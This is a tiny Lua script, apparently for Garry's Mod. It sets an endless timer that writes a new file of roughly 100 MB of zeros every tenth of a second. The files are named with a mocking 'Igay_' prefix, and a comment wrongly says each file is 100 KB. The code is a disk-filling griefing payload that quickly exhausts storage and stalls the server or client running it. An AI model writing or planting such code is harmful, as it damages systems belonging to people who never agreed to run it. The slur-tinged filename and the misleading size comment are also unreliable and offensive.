timer.Create("spam_files", 0.1, 0, function()
    local filename = "Igay_" .. tostring(os.time()) .. "_" .. math.random(1,100000) .. ".txt"
    local content = string.rep("0", 10240 * 10240) -- 100 КБ
    file.Write(filename, content)

    
end)
